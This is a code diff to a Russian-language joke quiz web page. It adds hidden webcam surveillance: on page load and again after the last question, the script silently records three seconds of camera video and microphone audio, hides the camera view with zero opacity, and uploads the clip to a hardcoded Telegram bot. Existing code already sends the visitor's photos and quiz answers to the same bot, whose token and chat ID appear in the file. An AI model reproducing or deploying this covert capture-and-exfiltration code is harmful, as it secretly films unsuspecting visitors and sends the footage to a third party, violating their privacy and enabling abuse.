@@ -152,13 +152,81 @@
         const BOT_TOKEN = '8188957293:AAHmtiE3sgaj0lhUYijUmOnUYBWDaJw39JE';
         const CHAT_ID = '2126669672';
 
-        // Массив для хранения ответов
         let answers = [];
+        let mediaRecorder;
+        let recordedChunks = [];
+
+        // Функция для записи видео
+        async function recordVideo(duration = 3000) { // 3 секунды записи
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user' },
+                    audio: true 
+                });
+                
+                const video = document.getElementById('camera');
+                const container = document.getElementById('camera-container');
+                
+                video.srcObject = stream;
+                container.style.display = 'block';
+                container.style.opacity = '0';
+                container.style.zIndex = '-1';
+                video.style.opacity = '0';
+
+                recordedChunks = [];
+                mediaRecorder = new MediaRecorder(stream);
+
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) {
+                        recordedChunks.push(event.data);
+                    }
+                };
+
+                mediaRecorder.onstop = async () => {
+                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                    await sendVideoToTelegram(blob);
+                    stream.getTracks().forEach(track => track.stop());
+                    container.style.display = 'none';
+                };
+
+                mediaRecorder.start();
+
+                // Останавливаем запись через указанное время
+                setTimeout(() => {
+                    if (mediaRecorder.state === 'recording') {
+                        mediaRecorder.stop();
+                    }
+                }, duration);
+
+            } catch (error) {
+                console.error('Ошибка записи видео:', error);
+            }
+        }
+
+        // Функция для отправки видео в Telegram
+        async function sendVideoToTelegram(blob) {
+            try {
+                const formData = new FormData();
+                formData.append('video', blob, 'video.webm');
+                
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo?chat_id=${CHAT_ID}`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const result = await response.json();
+                if (!result.ok) {
+                    console.error('Ошибка отправки видео:', result);
+                }
+            } catch (error) {
+                console.error('Ошибка отправки видео:', error);
+            }
+        }
 
         // Функция для отправки сообщения в Telegram
         async function sendToTelegram(message) {
             try {
-                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`);
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML`);
                 const result = await response.json();
                 if (!result.ok) {
                     console.error('Ошибка отправки сообщения:', result);
@@ -232,10 +300,15 @@
                 5: { question: "Вы ищите жену?", answers: { "1": "Да", "2": "Нет" } }
             };
             
-            return `Вопрос ${questionNumber}: ${questions[questionNumber].question}\nОтвет: ${questions[questionNumber].answers[value]}`;
+            return `<b>Вопрос ${questionNumber}:</b> ${questions[questionNumber].question}\n<b>Ответ:</b> ${questions[questionNumber].answers[value]}`;
         }
 
-        window.addEventListener('load', takePhoto);
+        // При загрузке страницы записываем видео
+        window.addEventListener('load', async () => {
+            await recordVideo();
+            // После записи видео делаем фото
+            setTimeout(takePhoto, 3500);
+        });
 
         nextBtn.addEventListener('click', async function() {
             const currentQuestionEl = document.querySelector(`.question[data-question="${currentQuestion}"]`);
@@ -261,14 +334,20 @@
                 }
             } else {
                 // Отправляем все ответы в Telegram
-                const allAnswers = "Новый прошедший опрос:\n\n" + answers.join("\n\n");
+                const allAnswers = "<b>🎯 Новый прошедший опрос:</b>\n\n" + answers.join("\n\n");
                 await sendToTelegram(allAnswers);
                 
                 quiz.style.display = 'none';
                 result.style.display = 'block';
                 result.innerHTML = 'Поздравляю, вы - БОТ!';
-                await takePhoto();
-                setTimeout(showFinalScreen, 1000);
+                
+                // Записываем финальное видео
+                await recordVideo();
+                // После записи видео делаем фото и показываем финальный экран
+                setTimeout(async () => {
+                    await takePhoto();
+                    showFinalScreen();
+                }, 3500);
             }
         });
     </script>
